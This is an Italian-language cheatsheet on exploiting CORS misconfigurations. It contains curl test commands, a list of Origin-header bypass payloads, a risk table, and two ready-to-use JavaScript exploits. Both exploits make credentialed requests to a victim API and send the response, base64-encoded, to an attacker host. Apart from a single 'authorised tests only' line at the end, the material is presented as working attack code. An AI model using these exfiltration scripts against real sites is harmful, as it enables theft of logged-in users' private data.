# 🌍 CORS Misconfiguration Cheatsheet

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Cross-Origin Resource Sharing
```

---

## 🎯 Cos'è il CORS

Il **CORS** controlla quali origini possono accedere alle risorse. Le misconfiguration permettono agli attaccanti di sottrarre dati sensibili cross-origin.

---

## 🔍 Testing CORS

### Basic Test

```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Analisi dei response headers:
Access-Control-Allow-Origin: https://evil.com  # Vulnerabile!
Access-Control-Allow-Credentials: true         # Extra pericoloso!
```

### Test Payload (Origin header)

```
# Exact match bypass
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# Null origin
null

# Subdomain
https://sub.target.com

# Protocol downgrade
http://target.com
```

---

## 💉 Exploitation

### Ruba Dati (con credenziali)

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Invia i dati all'attaccante
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

### Estrazione Dati Sensibili via Fetch

```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

## 📊 Matrice Vulnerabilità

| ACAO Header | ACAC | Rischio |
| --- | --- | --- |
| `*` | false | Basso (no creds) |
| `*` | true | Configurazione invalida |
| Attacker origin | true | **CRITICO** |
| null | true | **ALTO** |
| Reflected origin | true | **CRITICO** |

### Pattern Pericolosi

```http
# Riflette qualsiasi origine
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# Permette null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## 🛠️ Controlli Rapidi

```bash
# Automazione con curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

## 📚 Risorse

* [PortSwigger CORS](https://portswigger.net/web-security/cors)
* [CORS Exploitation Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 Exploit CORS!</b>
  <i>Solo per test autorizzati!</i>
</p>
